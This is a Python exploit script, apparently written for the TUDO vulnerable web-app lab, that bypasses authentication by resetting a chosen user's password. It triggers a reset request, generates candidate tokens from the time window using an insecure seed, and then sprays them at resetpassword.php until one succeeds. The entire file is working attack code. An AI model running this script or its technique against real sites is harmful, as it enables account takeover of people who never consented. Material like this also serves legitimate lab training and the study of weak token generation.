# TUDO Authentication Bypass #2 - "insecureSeed"
# William Moody
# December 22, 2025

import requests
import argparse
import sys
import subprocess
import time

# Parse arguments
parser = argparse.ArgumentParser(description="Resets targeted user's password by spraying \
    possible password reset tokens based on insecure random seed")
parser.add_argument("target",help="Target URL")
parser.add_argument("user",help="Target user")
parser.add_argument("password",help="New password")
parser.add_argument("-s", "--seconds", help="How many seconds to generate possible tokens for", default="3")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Send "forgot password" request for victim user, and keep track of possible timestamps (seeds) 
ts_lower = int(time.time()*1000)
r = requests.post(
    f"{args.target}/forgotpassword.php",
    data={"username":args.user}
)
ts_upper = int(time.time()*1000)
assert "Email sent!" in r.text
print(f"[*] Requested password reset for {args.user}")

# Generate possible tokens between ts_lower and ts_upper
try:
    tokens = subprocess.check_output(["php", "auth/generateTokens.php", str(ts_lower), str(ts_upper)])
    tokens = tokens[:-1].decode().split("\n")
    print(f"[*] Generated {ts_upper - ts_lower} possible tokens between {ts_lower} and {ts_upper}")
except Exception as e:
    print(f"[-] Failed to generate tokens: {e}")
    exit(1)

# Spray tokens to reset victim's password
print("[*] Trying token: ", end='')
for token in tokens:
    print(token,end='')
    sys.stdout.flush()

    r = requests.post(
        f"{args.target}/resetpassword.php",
        data={"token":token,"password1":args.password,"password2":args.password}
    )

    if "Password changed!" in r.text:
        print(f"\n[+] Set {args.user}'s password to {args.password}")
        exit(0)
    
    sys.stdout.write("\b"*32)